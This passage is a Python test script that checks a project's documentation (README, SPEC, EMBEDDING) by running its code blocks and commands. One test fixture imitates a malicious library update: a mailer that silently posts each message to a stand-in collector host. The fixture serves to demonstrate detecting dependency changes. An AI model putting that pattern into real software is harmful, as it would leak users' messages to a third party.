#!/usr/bin/env python3
"""The documents are true: README.md, SPEC.md and EMBEDDING.md, read as tests
(8.2).

    python check_docs.py

CODE BLOCKS. Every fenced block names its kind after the fence, and either
runs or says in the document why it does not:

  vel         Velaris source: `velaris check` passes on it. A block with no
              `fn main` is checked with an empty one added.
  sh          commands. Each line runs - `velaris`, `python`, `cd`, `&&`,
              `> file` and `| jq .field` as a shell would take them, a glob
              expanded - in a scratch directory of its own that holds the
              files the block names: copied from this repository with what
              they import, or from FIXTURES for a name that stands for a
              reader's own file (script.vel, agent.vel, src/...). A block that
              runs `capabilities check` before any `capabilities init` gets a
              baseline written first. Every line must exit 0 unless a marker
              says otherwise.
  console     `$ ` lines are commands, run as above, and the lines under one
              are what it prints: every E-code shown must be in its output,
              and it must exit non-zero when it shows one; JSON shown after
              `| jq` must equal what the command gives.
  python      runs with this repository first on sys.path, in a scratch
              directory holding FIXTURES, with `velaris` imported and `source`
              holding agent_output.vel's text.
  json        parses, and validates against the schema its content names:
              velaris.audit/1 (velaris-spec), an in-toto Statement and its
              predicate, or the capability predicate (tests/ and docs/ here).
              A string holding "..." or an object with a "..." key is an
              elision, and a schema error at or under one is not counted.
  yaml        parses; a pre-commit configuration names only hooks that
              .pre-commit-hooks.yaml has, at the tag the Action is pinned to.
  text, javascript
              need a marker.

MARKERS are HTML comments on the lines just above the fence, which GitHub and
PyPI do not show:

  <!-- illustrative: why -->              the block is not run
  <!-- illustrative lines 1,3-4: why -->  those lines of it are not run
  <!-- expect: E700 -->                    a vel block must be refused with it
  <!-- expect lines 1: exit 1, why -->     a command must exit so
  <!-- output -->                          each line is in what the block
                                           above printed
  <!-- output: codes only; why -->         only its E-codes are held to that
  <!-- output of: velaris ... -->          each line is in what that prints

A line marked illustrative that runs `velaris` must still name a command
Velaris has, and one that runs `python X.py` a file that is here.

INLINE COMMANDS. A code span `velaris ...` in running text runs, in a scratch
directory with FIXTURES, when it names a file, and must exit 0. Otherwise
`velaris <command> --help` must answer, and name every word of the span; a
flag may be named by the top-level usage instead. A span with a placeholder,
or one that needs a network, a door or a token, is in INLINE_LISTED with its
reason.

DRIFT. `build_readme.py --check`: every count README.md states, its benchmark
table, and SPEC.md's version and count of currencies, against what they
count. Every E-code SPEC.md, README.md, EMBEDDING.md, LLM.md and docs/*.md
cite is in velaris.ERROR_TABLE, or in REMOVED_ERRORS on a line that says it
was removed; a group such as E56x holds a code. A code given with a
description - a table row, or `E### (...)` - matches the table's text (half
of the description's words are in it), or is in PARAPHRASES with a reason.
No number in README.md's running text or code comments is left ungenerated
unless NOT_COUNTS says why (a number with a point is read as a version).
"Not a security boundary" stands within 8 lines of README's headline. Every
path README.md names exists, but NOT_PATHS. SPEC.md's `Version X.Y.Z.` is
velaris.VERSION. CONSTANTS - the proof budgets, the currencies' digits,
the doors' ceilings - say what the implementation holds, and SPEC.md's and
LLM.md's lists of fallible builtins are velaris.FALLIBLE_BUILTINS.

NOTHING REACHES THE INTERNET: a line that would is marked, and every command
runs with HTTP_PROXY and HTTPS_PROXY at a closed local port (NO_PROXY for
127.0.0.1), so a request that got past a marker fails on this machine.

Without z3-solver, what only the prover decides - an expected E7xx, the exit
status of `proofs --min`, the proven share - is skipped with a notice.
Without velaris-spec's corpus, `velaris conformance` is skipped the same way;
without its schemas, jsonschema or PyYAML, what needs them is.
"""
from __future__ import annotations

import concurrent.futures
import glob
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Any, Callable, cast

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import velaris  # noqa: E402
from suite_dirs import isolate  # noqa: E402

WORK = isolate("check_docs")
VELARIS_PY = str(HERE / "velaris.py")
DOCS = ("README.md", "SPEC.md", "EMBEDDING.md", "TUTORIAL.md")
CODE_DOCS = (["SPEC.md", "README.md", "EMBEDDING.md", "LLM.md", "TUTORIAL.md"]
             + sorted(f"docs/{p.name}" for p in (HERE / "docs").glob("*.md")))

try:
    import z3  # noqa: F401
    HAVE_Z3 = True
except ImportError:
    HAVE_Z3 = False

ENV = dict(os.environ, HTTP_PROXY="http://127.0.0.1:9",
           HTTPS_PROXY="http://127.0.0.1:9", http_proxy="http://127.0.0.1:9",
           https_proxy="http://127.0.0.1:9", NO_PROXY="127.0.0.1,localhost",
           no_proxy="127.0.0.1,localhost", PYTHONIOENCODING="utf-8",
           PYTHONUTF8="1")
TIMEOUT = 300

HELLO = 'fn main() uses io {\n    print("hello")\n}\n'

# the files a document names that stand for a reader's own
FIXTURES = {
    "agent_output.vel": HELLO,
    "script.vel": HELLO,
    "agent.vel": HELLO,
    "hello.vel": HELLO,
    "myprogram.vel": HELLO,
    "file.vel": HELLO,
    "src/report.vel": HELLO,
    "program.vel": ('fn add1(n: Int) -> Int\n    ensures result == n + 1\n{\n'
                    '    return n + 1\n}\n\n'
                    'fn test_add1() -> Bool {\n    return add1(1) == 2\n}\n\n'
                    'fn main() uses io {\n    print(add1(1))\n}\n'),
    # README's deps-diff example: a mail library whose 1.5.0 sends a copy
    "vendor/mailer/1.4.0/mailer.vel": (
        'fn send(to: Text, body: Text) -> Text uses net {\n'
        '    check post("https://mail.example.com/send", to + "\\n" + body) {\n'
        '        ok sent { return "sent" }\n'
        '        fail why { return why }\n'
        '    }\n'
        '}\n'),
    "vendor/mailer/1.5.0/mailer.vel": (
        'fn send(to: Text, body: Text) -> Text uses net {\n'
        '    let copy = to + "\\n" + body\n'
        '    check post("https://collector.example.net/copy", copy) {\n'
        '        ok copied { }\n'
        '        fail missed { }\n'
        '    }\n'
        '    check post("https://mail.example.com/send", copy) {\n'
        '        ok sent { return "sent" }\n'
        '        fail why { return why }\n'
        '    }\n'
        '}\n'),
}

# what a command reads on its standard input, by the line as written
STDIN = {
    "velaris new hello && cd hello && velaris main.vel": "21\n",
}

INLINE_LISTED = {
    "velaris <file>": "a placeholder for a program",
    "velaris examples/wordcount.vel --allow fs:read,io <file> [n]":
        "a placeholder for the file to count",
    "velaris examples/linkcheck.vel --allow io,net <url> ...":
        "it reaches the network",
    "velaris mcp-manifest -o tools.json -- <server command>":
        "a placeholder for the server's command",
    "velaris proofs examples stdlib":
        "build_readme.py runs it to measure the proven share; it exits 1, "
        "since some examples are built to be refused",
}

# (document, code, the description's first words): why it is not the table's
PARAPHRASES = {
    ("LLM.md", "E300", "effect not declared"):
        "the card quotes the message a model meets for env()",
    ("LLM.md", "E403", "divide by zero"): "the card's shorter words",
    ("LLM.md", "E513", "redefining an imported"):
        "the case a model meets: its own function named like an imported one",
    ("LLM.md", "E514", "local name collides"): "the card's shorter words",
    ("LLM.md", "E525", "binding the result"):
        "the card's name for the same mistake",
    ("LLM.md", "E602", "a list read went out"): "the card's shorter words",
    ("LLM.md", "E542", "a function value that does not fit"):
        "the card says when it is given: the table's words also fit E501",
}

# (document, the text just before the list, the text just after): each
# names exactly velaris.FALLIBLE_BUILTINS, and `get` on a map
FALLIBLE_LISTS = (
    ("SPEC.md", "Fallible builtins:", "`get` on a **list**"),
    ("LLM.md", "These can fail:", "Handle with"),
)

# numbers in README.md that are not counts of this repository:
# (a pattern around the number, why)
NOT_COUNTS = [
    (r"Scala 3\b", "the version of Scala TACIT uses"),
    (r"~10,000\S* on hot arithmetic, ~45\S* on text building",
     "speed-ups measured once, not counts"),
    (r"\b200 sequential bounded runs", "a measurement on one machine"),
    (r"\b64-bit", "the size of a whole number"),
    (r"held as 1250", "an example amount"),
    (r"September 2025", "a date"),
    (r"category 12\b", "a category's number"),
    (r"exits 3\s*$", "an exit status deps-diff gives"),
    (r"rather than 0\.", "an exit status deps-diff gives"),
    (r"Exit codes: 0 when", "an exit status deps-diff gives"),
    (r"gained; 1\s*$", "an exit status deps-diff gives"),
    (r"gained; 3 when", "an exit status deps-diff gives"),
    (r"derived; 2 when", "an exit status deps-diff gives"),
    (r"~90 MB", "the size of one build, which differs by platform"),
    (r"below 80%", "the threshold the command is given"),
    (r"exit 1 as the plain check", "an exit status"),
]

# repository-shaped names in README.md that are not files here: (name, why)
NOT_PATHS = {
    ".github/workflows/velaris.yml":
        "the workflow a reader copies into their own repository",
    "main.py": "the file velaris eject writes",
    "setup.py": "a Python package's, which deps-diff reads",
}

# (document, pattern, what the implementation holds for its groups)
CONSTANTS = (
    ("SPEC.md", r"\*\*(\d+) seconds\*\* when the function mentions `Float` "
                r"and\s+\*\*(\d+) seconds\*\* otherwise",
     lambda: (velaris.FLOAT_PROOF_SECONDS, velaris.PROOF_SECONDS)),
    ("SPEC.md", r"(\d) digits for INR, USD, EUR and most others, (\d) for "
                r"JPY\s+and KRW, (\d) for KWD, BHD, JOD and OMR",
     lambda: (currency_digits(("INR", "USD", "EUR"), majority=True),
              currency_digits(("JPY", "KRW")),
              currency_digits(("KWD", "BHD", "JOD", "OMR")))),
    ("EMBEDDING.md", r"\| seconds per run \| `--max-timeout` \| (\d+) \|",
     lambda: (velaris.DOOR_MAX_TIMEOUT,)),
    ("EMBEDDING.md", r"\| MB per run \| `--max-memory-mb` \| (\d+) \|",
     lambda: (velaris.DOOR_MAX_MEMORY_MB,)),
    ("EMBEDDING.md", r"\| seconds per check or audit \(8\.1\) \| "
                     r"`--check-timeout` \| (\d+) \|",
     lambda: (velaris.CHECK_TIMEOUT_DEFAULT,)),
    ("EMBEDDING.md", r"\| MB per check or audit \(8\.1\) \| "
                     r"`--check-memory-mb` \| (\d+) \|",
     lambda: (velaris.CHECK_MEMORY_MB_DEFAULT,)),
    ("EMBEDDING.md", r"\| requests a minute \(8\.1\) \| `--rate-limit` \| "
                     r"(\d+) \|",
     lambda: (velaris.DOOR_RATE_LIMIT,)),
)


def currency_digits(codes: Any, majority: bool = False) -> Any:
    got = {velaris.CURRENCIES[c] for c in codes}
    if majority:
        values = list(velaris.CURRENCIES.values())
        got.add(max(set(values), key=values.count))
    return got.pop() if len(got) == 1 else sorted(got)


# ---------------------------------------------------------------------------
# reporting

LOCK = threading.Lock()


def ascii_text(text: str) -> str:
    return text.encode("ascii", "replace").decode("ascii")


class Result:
    """What one task found: (status, text) entries, and what it printed."""

    def __init__(self, label: str) -> None:
        self.label = label
        self.entries: list[Any] = []
        self.output = ""
        self.ran = False

    def ok(self, text: str) -> None:
        self.entries.append(("ok", text))

    def wrong(self, text: str) -> None:
        self.entries.append(("WRONG", text))

    def skip(self, text: str) -> None:
        self.entries.append(("skip", text))


def shorten(text: str, n: int = 300) -> str:
    text = " | ".join(line for line in text.strip().splitlines() if line.strip())
    return text if len(text) <= n else text[:n] + " ..."


# ---------------------------------------------------------------------------
# reading the documents

FENCE = re.compile(r"^```([A-Za-z0-9_+-]*)\s*$")
COMMENT = re.compile(r"^<!--\s*(.*?)\s*-->\s*$")
MARKER_WORDS = re.compile(r"^(illustrative|expect|output)\b")


class Block:
    def __init__(self, doc: str, line: int, info: str, body: list[Any],
                 markers: list[Any]) -> None:
        self.doc, self.line, self.info, self.body = doc, line, info, body
        self.label = f"{doc}:{line} {info or '(no kind)'}"
        self.illustrative: str | None = None  # the reason, for the whole block
        self.illustrative_lines: dict[Any, Any] = {}  # line -> reason
        self.expect: tuple[list[str], int | None] | None = None  # (codes, exit)
        self.expect_lines: dict[Any, Any] = {}
        self.output: str | None = None      # "lines" or "codes"
        self.output_of: str | None = None
        self.problems: list[Any] = []
        for text in markers:
            self._marker(text)

    def _marker(self, text: str) -> None:
        m = re.fullmatch(r"illustrative(?: lines? ([\d,\s-]+))?:\s*(.+)", text)
        if m:
            if m.group(1):
                for n in line_numbers(m.group(1)):
                    self.illustrative_lines[n] = m.group(2)
            else:
                self.illustrative = m.group(2)
            return
        m = re.fullmatch(r"expect(?: lines? ([\d,\s-]+))?:\s*(.+)", text)
        if m:
            codes = re.findall(r"\bE\d{3}\b", m.group(2))
            ex = re.search(r"\bexit (\d+)", m.group(2))
            want = (codes, int(ex.group(1)) if ex else None)
            if m.group(1):
                for n in line_numbers(m.group(1)):
                    self.expect_lines[n] = want
            else:
                self.expect = want
            return
        m = re.fullmatch(r"output of:\s*(.+)", text)
        if m:
            self.output_of = m.group(1)
            return
        m = re.fullmatch(r"output(?::\s*(.+))?", text)
        if m:
            self.output = ("codes" if (m.group(1) or "").startswith(
                "codes only") else "lines")
            if m.group(1) and self.output == "lines":
                self.problems.append(f"an output marker says {text!r}; it is "
                                     "<!-- output --> or <!-- output: codes "
                                     "only; why -->")
            return
        self.problems.append(f"a comment above the fence is not a marker: "
                             f"{text!r}")


def line_numbers(spec: str) -> set[Any]:
    out: set[Any] = set()
    for part in spec.split(","):
        m = re.fullmatch(r"\s*(\d+)(?:\s*-\s*(\d+))?\s*", part)
        if not m:
            raise SystemExit(f"a marker's lines cannot be read: {spec!r}")
        out.update(range(int(m.group(1)), int(m.group(2) or m.group(1)) + 1))
    return out


def read_document(doc: str) -> tuple[Any, ...]:
    """(blocks, prose lines as (number, text), stray markers)"""
    lines = (HERE / doc).read_text(encoding="utf-8").splitlines()
    blocks, prose, used = [], [], set()
    i = 0
    while i < len(lines):
        m = FENCE.match(lines[i])
        if not m:
            prose.append((i + 1, lines[i]))
            i += 1
            continue
        start = i
        markers: list[str]
        markers, j = [], i - 1
        while j >= 0 and COMMENT.match(lines[j]):
            markers.insert(0, cast(re.Match[str], COMMENT.match(lines[j])).group(1))
            used.add(j + 1)
            j -= 1
        i += 1
        body = []
        while i < len(lines) and lines[i].rstrip() != "```":
            body.append(lines[i])
            i += 1
        blocks.append(Block(doc, start + 1, m.group(1), body, markers))
        i += 1
    stray = [(n, t) for n, t in prose
             if COMMENT.match(t) and MARKER_WORDS.match(
                 cast(re.Match[str], COMMENT.match(t)).group(1))
             and n not in used]
    return blocks, prose, stray


# ---------------------------------------------------------------------------
# running commands the way a shell would

class Unsupported(Exception):
    pass


def logical_lines(body: list[Any]) -> list[Any]:
    """[(first line number, text)], a line ending in a backslash joined to
    the next."""
    out, i = [], 0
    while i < len(body):
        start, text = i, body[i]
        while text.rstrip().endswith("\\") and i + 1 < len(body):
            i += 1
            text = text.rstrip()[:-1] + " " + body[i].strip()
        out.append((start + 1, text))
        i += 1
    return out


def tokens_of(line: str) -> list[Any]:
    lex = shlex.shlex(line, posix=True, punctuation_chars="|&><;")
    lex.whitespace_split = True
    return list(lex)


def plain(line: str) -> str:
    """A line as a key: its tokens, comments dropped."""
    try:
        return " ".join(tokens_of(line))
    except ValueError:
        return line.strip()


def is_comment(text: str) -> bool:
    return not text.strip() or text.strip().startswith("#")


def split_on(tokens: list[Any], word: str) -> list[Any]:
    part: list[Any]
    parts, part = [], []
    for t in tokens:
        if t == word:
            parts.append(part)
            part = []
        else:
            part.append(t)
    parts.append(part)
    return parts


def jq(text: str, path: str) -> str:
    value = json.loads(text)
    for key in [k for k in path.split(".") if k]:
        value = value[key]
    return json.dumps(value, indent=2)


def argv_of(words: list[Any], cwd: Path) -> list[Any]:
    head, rest = words[0], []
    for w in words[1:]:
        if any(c in w for c in "*?") and not w.startswith("-") and ":" not in w:
            found = sorted(glob.glob(str(cwd / w)))
            rest += [os.path.relpath(f, cwd) for f in found] or [w]
        else:
            rest.append(w)
    if head == "velaris":
        return [sys.executable, VELARIS_PY] + rest
    if head == "python":
        return [sys.executable] + rest
    raise Unsupported(f"{head!r} is not a command this suite runs")


CACHE: dict[str, tuple[int, str]] = {}


def run_line(line: str, cwd: Path, stdin: str = "") -> tuple[Any, ...]:
    """(exit status, what it printed, the directory it ended in)"""
    key = plain(line)
    cacheable = key.startswith("velaris conformance")
    if cacheable:
        with LOCK:
            if key in CACHE:
                return CACHE[key] + (cwd,)
    code, shown = 0, ""
    for words in split_on(tokens_of(line), "&&"):
        if not words:
            raise Unsupported("an empty command")
        if words[0] == "cd":
            cwd = cwd / words[1]
            continue
        into = None
        if ">" in words:
            at = words.index(">")
            into, words = words[at + 1], words[:at]
        pipe = None
        if "|" in words:
            at = words.index("|")
            pipe, words = words[at + 1:], words[:at]
            if len(pipe) != 2 or pipe[0] != "jq":
                raise Unsupported(f"a pipe to {' '.join(pipe)!r}")
        if any(t in words for t in ("|", ";", "<", "&", ">")):
            raise Unsupported("more shell than this suite reads")
        done = subprocess.run(argv_of(words, cwd), cwd=cwd, input=stdin,
                              capture_output=True, text=True, encoding="utf-8",
                              errors="replace", timeout=TIMEOUT, env=ENV)
        out, err, code = done.stdout, done.stderr, done.returncode
        if pipe and code == 0:
            out = jq(out, pipe[1])
        if into:
            (cwd / into).write_text(out, encoding="utf-8")
            out = ""
        shown += out + err
        if code != 0:
            break
    if cacheable:
        with LOCK:
            CACHE[key] = (code, shown)
    return code, shown, cwd


IMPORT = re.compile(r'^\s*import\s+"([^"]+)"', re.M)


def copy_in(rel: str, dest: Path) -> None:
    src = HERE / rel
    target = dest / rel
    if target.exists():
        return
    if src.is_dir():
        shutil.copytree(src, target, dirs_exist_ok=True,
                        ignore=shutil.ignore_patterns("__pycache__"))
    elif src.is_file():
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, target)
        if src.suffix == ".vel":
            for name in IMPORT.findall(src.read_text(encoding="utf-8")):
                other = (src.parent / name).resolve()
                try:
                    copy_in(other.relative_to(HERE).as_posix(), dest)
                except ValueError:
                    pass


def scratch(lines: list[Any]) -> Path:
    """A directory holding FIXTURES and every repository file the lines name."""
    where = Path(tempfile.mkdtemp(prefix="block-", dir=WORK))
    for name, text in FIXTURES.items():
        (where / name).parent.mkdir(parents=True, exist_ok=True)
        (where / name).write_text(text, encoding="utf-8")
    for line in lines:
        try:
            words = tokens_of(line)
        except ValueError:
            continue
        for w in words:
            w = w.replace("\\", "/")
            if (w.startswith(("-", "/")) or "://" in w or ":" in w
                    or ".." in w or w in (".", "")):
                continue
            if any(c in w for c in "*?"):
                for found in HERE.glob(w):
                    copy_in(found.relative_to(HERE).as_posix(), where)
            elif (HERE / w).exists():
                copy_in(w, where)
    return where


def corpus_found() -> bool:
    """Whether velaris-spec's corpus is here - and, when it is, the commands
    this suite runs are told where, through VELARIS_CONFORMANCE_CORPUS. They
    run from a scratch directory, and an installed velaris looks beside the
    working directory and beside its own install, neither of which is this
    checkout: CI checks velaris-spec out inside it, so every documented
    `velaris conformance` exited 2 there until 8.2 said where."""
    places = [HERE / "velaris-spec" / "tests",
              HERE.parent / "velaris-spec" / "tests"]
    if os.environ.get("VELARIS_CONFORMANCE_CORPUS"):
        places.insert(0, Path(os.environ["VELARIS_CONFORMANCE_CORPUS"]))
    for place in places:
        if (place / "index.json").is_file():
            ENV.setdefault("VELARIS_CONFORMANCE_CORPUS", str(place.resolve()))
            return True
    return False


def usage_commands() -> set[Any]:
    return set(velaris.usage_lines())


def prover_decides(words: list[Any], codes: list[Any]) -> bool:
    return (any(c.startswith("E7") for c in codes)
            or ("proofs" in words and "--min" in words))


def check_marked_line(result: Result, where: str, text: str) -> None:
    """A line not run must still name what is here."""
    try:
        words = tokens_of(text)
    except ValueError:
        return
    if not words:
        return
    if words[0] == "velaris" and len(words) > 1:
        w = words[1]
        if not (w in usage_commands() or w.startswith("-")
                or w.endswith(".vel")):
            result.wrong(f"{where}: `velaris {w}` is not a command "
                         "velaris --help lists")
        elif w.endswith(".vel") and w.startswith("examples/") \
                and not (HERE / w).exists():
            result.wrong(f"{where}: {w} is not in this repository")
    if words[0] == "python" and len(words) > 1 and words[1].endswith(".py") \
            and not (HERE / words[1]).exists():
        result.wrong(f"{where}: {words[1]} is not in this repository")


def expect_exit(result: Result, where: str, text: str, code: int, shown: str,
                codes: list[Any], exit_: int | None) -> None:
    words = tokens_of(text)
    if not HAVE_Z3 and prover_decides(words, codes):
        result.skip(f"{where}: `{plain(text)}` - what it gives is the "
                    "prover's to decide, and z3-solver is not installed")
        return
    missing = [c for c in codes if c not in shown]
    want = exit_ if exit_ is not None else (1 if codes else 0)
    good_exit = (code != 0) if (codes and exit_ is None) else code == want
    if good_exit and not missing:
        result.ok(f"{where}: `{plain(text)}` exits {code}"
                  + (f", {', '.join(codes)}" if codes else ""))
    else:
        result.wrong(f"{where}: `{plain(text)}` exited {code}, expected "
                     f"{'non-zero' if codes and exit_ is None else want}"
                     + (f"; missing {missing}" if missing else "")
                     + f"\n         {shorten(shown)}")


# ---------------------------------------------------------------------------
# one task per block

def run_sh(block: Block) -> Result:
    r = Result(block.label)
    lines = logical_lines(block.body)
    runnable = [t for n, t in lines if not is_comment(t)
                and n not in block.illustrative_lines]
    where = scratch(runnable)
    if any("capabilities check" in t for t in runnable) and not any(
            "capabilities init" in t for t in runnable):
        subprocess.run([sys.executable, VELARIS_PY, "capabilities", "init"],
                       cwd=where, capture_output=True, timeout=TIMEOUT, env=ENV)
    cwd = where
    for n, text in lines:
        label = f"{block.doc}:{block.line + n}"
        if is_comment(text):
            continue
        if n in block.illustrative_lines:
            check_marked_line(r, label, text)
            continue
        try:
            words = tokens_of(text)
        except ValueError as e:
            r.wrong(f"{label}: cannot be read as a command ({e})")
            continue
        if "conformance" in words and not corpus_found():
            r.skip(f"{label}: `{plain(text)}` - velaris-spec's corpus is not "
                   "beside or inside this checkout")
            continue
        try:
            code, shown, cwd = run_line(text, cwd, STDIN.get(plain(text), ""))
        except Unsupported as e:
            r.wrong(f"{label}: {e}; mark the line illustrative, with why")
            continue
        except subprocess.TimeoutExpired:
            r.wrong(f"{label}: `{plain(text)}` ran past {TIMEOUT} s")
            continue
        r.ran = True
        r.output += shown
        codes, exit_ = block.expect_lines.get(n, block.expect or ([], None))
        expect_exit(r, label, text, code, shown, codes, exit_)
    return r


def run_console(block: Block) -> Result:
    r = Result(block.label)
    commands: list[Any] = []
    for n, text in enumerate(block.body, 1):
        if text.startswith("$ "):
            commands.append([n, text[2:], []])
        elif commands:
            commands[-1][2].append(text)
        elif text.strip():
            r.wrong(f"{block.doc}:{block.line + n}: a console block's first "
                    "line is a `$ ` command")
    where = scratch([c[1] for c in commands])
    for n, text, shown_lines in commands:
        label = f"{block.doc}:{block.line + n}"
        shown_doc = "\n".join(shown_lines)
        codes = re.findall(r"\bE\d{3}\b", shown_doc)
        try:
            code, shown, _ = run_line(text, where)
        except Unsupported as e:
            r.wrong(f"{label}: {e}")
            continue
        r.ran = True
        r.output += shown
        expect_exit(r, label, text, code, shown, sorted(set(codes)), None)
        if shown_doc.strip().startswith(("{", "[")) and code == 0:
            try:
                same = json.loads(shown_doc) == json.loads(shown)
            except ValueError as e:
                same = False
                shown = f"{e}: {shown}"
            if same:
                r.ok(f"{label}: prints the JSON shown")
            else:
                r.wrong(f"{label}: prints other JSON than the document "
                        f"shows\n         {shorten(shown)}")
    return r


def run_vel(block: Block) -> Result:
    r = Result(block.label)
    where = Path(tempfile.mkdtemp(prefix="vel-", dir=WORK))
    source = "\n".join(block.body) + "\n"
    if not re.search(r"^fn main\(", source, re.M):
        source += "\nfn main() {\n}\n"
    (where / "block.vel").write_text(source, encoding="utf-8")
    text = "velaris check block.vel"
    code, shown, _ = run_line(text, where)
    r.ran = True
    r.output = shown
    codes, _exit = block.expect or ([], None)
    expect_exit(r, block.label, text, code, shown, codes, None)
    return r


PRELUDE = ("import sys\nsys.path.insert(0, {repo!r})\nimport velaris\n"
           "source = open('agent_output.vel', encoding='utf-8').read()\n"
           "# ---- the block\n")


def run_python(block: Block) -> Result:
    r = Result(block.label)
    where = scratch([])
    (where / "block.py").write_text(PRELUDE.format(repo=str(HERE))
                                    + "\n".join(block.body) + "\n",
                                    encoding="utf-8")
    try:
        done = subprocess.run([sys.executable, "block.py"], cwd=where,
                              capture_output=True, text=True, encoding="utf-8",
                              errors="replace", timeout=TIMEOUT, env=ENV)
    except subprocess.TimeoutExpired:
        r.wrong(f"{block.label}: ran past {TIMEOUT} s")
        return r
    r.ran = True
    r.output = done.stdout + done.stderr
    if done.returncode == 0:
        r.ok(f"{block.label}: runs")
    else:
        r.wrong(f"{block.label}: exited {done.returncode}\n         "
                f"{shorten(done.stderr, 600)}")
    return r


def schema_file(*parts: Any) -> Path | None:
    for base in (HERE, HERE / "velaris-spec", HERE.parent / "velaris-spec"):
        p = base.joinpath(*parts)
        if p.is_file():
            return p
    return None


def elided(value: Any) -> bool:
    return (isinstance(value, str) and "..." in value) or (
        isinstance(value, dict) and "..." in value)


def schema_errors(document: Any, schema_path: Path) -> list[Any]:
    import jsonschema
    schema = json.loads(schema_path.read_text(encoding="utf-8"))
    found = []
    for error in jsonschema.Draft202012Validator(schema).iter_errors(document):
        node, skip = document, elided(document)
        for key in error.absolute_path:
            node = node[key]
            skip = skip or elided(node)
        if not skip:
            found.append(f"{'/'.join(map(str, error.absolute_path))}: "
                         f"{error.message[:160]}")
    return found


def run_json(block: Block) -> Result:
    r = Result(block.label)
    try:
        document = json.loads("\n".join(block.body))
    except ValueError as e:
        r.wrong(f"{block.label}: does not parse: {e}")
        return r
    r.ran = True
    checks: list[tuple[Any, tuple[str, ...]]] = []
    if isinstance(document, dict):
        if document.get("schema") == "velaris.audit/1":
            checks.append((document, ("schemas", "velaris.audit.1.schema.json")))
        if document.get("_type") == "https://in-toto.io/Statement/v1":
            checks.append((document, ("tests", "in-toto-statement-v1.schema.json")))
            kind = str(document.get("predicateType", "")).rstrip("/").split("/")
            if kind[-2:] in (["receipt", "v1"], ["capability", "v1"]):
                checks.append((document.get("predicate"),
                               ("docs", kind[-2], "v1", "schema.json")))
        if {"producer", "audit"} <= set(document) and "auditedAt" in document:
            checks.append((document, ("docs", "capability", "v1", "schema.json")))
    if not checks:
        r.ok(f"{block.label}: parses (no schema names it)")
        return r
    try:
        import jsonschema  # noqa: F401
    except ImportError:
        r.skip(f"{block.label}: parses; jsonschema is not installed, so it is "
               "not validated")
        return r
    for part, where in checks:
        path = schema_file(*where)
        if path is None:
            r.skip(f"{block.label}: parses; {'/'.join(where)} is not here")
            continue
        errors = schema_errors(part, path)
        if errors:
            r.wrong(f"{block.label}: does not validate against "
                    f"{'/'.join(where)}: {errors[:3]}")
        else:
            r.ok(f"{block.label}: validates against {'/'.join(where)}")
    return r


def action_tag() -> str | None:
    text = (HERE / "README.md").read_text(encoding="utf-8")
    m = re.search(r"gowrishankar-infra/velaris-lang@[0-9a-f]{40}\s+#\s*(v[\d.]+)",
                  text)
    return m.group(1) if m else None


def run_yaml(block: Block) -> Result:
    r = Result(block.label)
    try:
        import yaml
    except ImportError:
        r.skip(f"{block.label}: PyYAML is not installed, so it is not parsed")
        return r
    try:
        document = yaml.safe_load("\n".join(block.body))
    except yaml.YAMLError as e:
        r.wrong(f"{block.label}: does not parse: {shorten(str(e))}")
        return r
    r.ran = True
    r.ok(f"{block.label}: parses")
    if isinstance(document, dict) and "repos" in document:
        hooks = {h["id"] for h in yaml.safe_load(
            (HERE / ".pre-commit-hooks.yaml").read_text(encoding="utf-8"))}
        for repo in document["repos"]:
            named = {h["id"] for h in repo.get("hooks", [])}
            if named - hooks:
                r.wrong(f"{block.label}: hooks .pre-commit-hooks.yaml does "
                        f"not have: {sorted(named - hooks)}")
            elif repo.get("rev") != action_tag():
                r.wrong(f"{block.label}: rev {repo.get('rev')} is not "
                        f"{action_tag()}, the tag the Action is pinned to")
            else:
                r.ok(f"{block.label}: its hooks exist, at {repo.get('rev')}")
    return r


def run_output_of(block: Block) -> Result:
    r = Result(block.label)
    where = scratch([block.output_of])
    code, shown, _ = run_line(cast(str, block.output_of), where)
    r.ran = True
    r.output = shown
    if code != 0:
        r.wrong(f"{block.label}: `{block.output_of}` exited {code}")
    return r


def normal(text: str) -> str:
    return re.sub(r"\s+", " ", text.replace("\\", "/")).strip()


def check_output(block: Block, printed: str, r: Result, what: str) -> None:
    shown = "\n".join(block.body)
    if block.output == "codes":
        codes = sorted(set(re.findall(r"\bE\d{3}\b", shown)))
        if not HAVE_Z3 and any(c.startswith("E7") for c in codes):
            r.skip(f"{block.label}: {', '.join(codes)} - the prover's to "
                   "give, and z3-solver is not installed")
        elif codes and all(c in printed for c in codes):
            r.ok(f"{block.label}: {', '.join(codes)} is what {what} gives")
        else:
            r.wrong(f"{block.label}: shows {codes}; {what} printed "
                    f"{shorten(printed)}")
        return
    whole = normal(printed)
    missing = [ln for ln in block.body if ln.strip()
               and normal(ln) not in whole]
    if missing:
        r.wrong(f"{block.label}: {len(missing)} line(s) are not in what "
                f"{what} printed, the first {missing[0].strip()!r}\n         "
                f"{shorten(printed)}")
    else:
        r.ok(f"{block.label}: every line is in what {what} printed")


# ---------------------------------------------------------------------------
# inline commands

HELP: dict[str, tuple[int, str, str]] = {}


def usage_of(command: str | None) -> tuple[Any, ...]:
    key = command or ""
    with LOCK:
        if key in HELP:
            return HELP[key]
    done = subprocess.run([sys.executable, VELARIS_PY]
                          + ([command] if command else []) + ["--help"],
                          capture_output=True, text=True, encoding="utf-8",
                          errors="replace", timeout=TIMEOUT, env=ENV)
    answer = (done.returncode, done.stdout, done.stderr)
    with LOCK:
        HELP[key] = answer
    return answer


def run_inline(span: str, places: list[Any]) -> Result:
    where_text = ", ".join(places[:3]) + (" ..." if len(places) > 3 else "")
    r = Result(span)
    words = span.split()[1:]
    if not words:
        r.wrong(f"{where_text}: `{span}` names no command")
        return r
    if any(w.startswith("<") for w in words) or "://" in span:
        r.wrong(f"{where_text}: `{span}` holds a placeholder or a URL; list it "
                "in INLINE_LISTED with why")
        return r
    files = [w for w in words if not w.startswith("-")
             and (w.endswith(".vel") or "/" in w or w in FIXTURES
                  or (HERE / w).exists())]
    if files:
        where = scratch([span])
        code, shown, _ = run_line(span, where, "")
        r.ran = True
        if code == 0:
            r.ok(f"{where_text}: `{span}` runs")
        else:
            r.wrong(f"{where_text}: `{span}` exited {code}\n         "
                    f"{shorten(shown)}")
        return r
    code, out, err = usage_of(words[0])
    top = usage_of(None)[1]
    r.ran = True
